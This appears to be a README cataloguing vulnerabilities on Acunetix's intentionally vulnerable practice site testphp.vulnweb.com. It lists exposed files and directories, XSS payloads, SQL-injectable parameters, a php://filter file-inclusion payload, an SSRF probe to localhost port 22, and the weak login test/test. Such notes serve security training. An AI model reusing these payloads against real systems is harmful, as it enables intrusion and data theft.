# Testphp_vulns
Collect all vulns and infomations in http://testphp.vulnweb.com/

## Sensitive Files

    http://testphp.vulnweb.com/index.zip
    http://testphp.vulnweb.com/.idea/workspace.xml
    http://testphp.vulnweb.com/admin/
    http://testphp.vulnweb.com/Mod_Rewrite_Shop/.htaccess
    http://testphp.vulnweb.com/crossdomain.xml
    http://testphp.vulnweb.com/CVS/Root
    http://testphp.vulnweb.com/secured/phpinfo.php
    http://testphp.vulnweb.com/_mmServerScripts/mysql.php
    

## Directory Index

    http://testphp.vulnweb.com/Flash/
    http://testphp.vulnweb.com/CVS/
    http://testphp.vulnweb.com/.idea/
  
## Infomation disclosure
  
    wvs@acunetix.com
    test@gmail.com
    http://127.0.0.1
    wasp@acunetix.com
  
## XSS
  
    POST http://testphp.vulnweb.com/search.php 'searchFor'
    POST http://testphp.vulnweb.com/guestbook.php 'name'
    POST http://testphp.vulnweb.com/secured/newuser.php 'uuname'
    
    GET http://testphp.vulnweb.com/listproducts.php?cat=<IMG sRC=X onerror=jaVaScRipT:alert`xss`>
    GET http://testphp.vulnweb.com/listproducts.php?artist=<IMG sRC=X onerror=jaVaScRipT:alert`xss`>
    GET http://testphp.vulnweb.com/hpp/?pp=%22%3E%3CIMG%20sRC=X%20onerror=jaVaScRipT:alert`xss`%3E
    GET http://testphp.vulnweb.com/hpp/params.php?p=<IMG sRC=X onerror=jaVaScRipT:alert`xss`>
    
## SQL Inject

    POST http://testphp.vulnweb.com/secured/newuser.php 'uuname' error SQLi vulnerable
    POST http://testphp.vulnweb.com/userinfo.php 'uname' blind SQLi vulnerable
    GET http://testphp.vulnweb.com/artists.php 'artist' error SQLi vulnerable
    GET http://testphp.vulnweb.com/listproducts.php 'cat' error SQLi vulnerable
    GET http://testphp.vulnweb.com/listproducts.php 'artist' error SQLi vulnerable
    GET http://testphp.vulnweb.com/product.php 'pic' error SQLi vulnerable
    
    GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php 'id' SQLi vulnerable
    GET http://testphp.vulnweb.com/AJAX/infocateg.php 'id' SQLi vulnerable
    
## File Include

    http://testphp.vulnweb.com/showimage.php?file=showimage.php
    http://testphp.vulnweb.com/showimage.php?file=php://filter/convert.base64-encode/resource=showimage.php
    
## SSRF

    http://testphp.vulnweb.com/showimage.php?file=http://127.0.0.1:22

## CLRF

## Weak Pass

    test/test
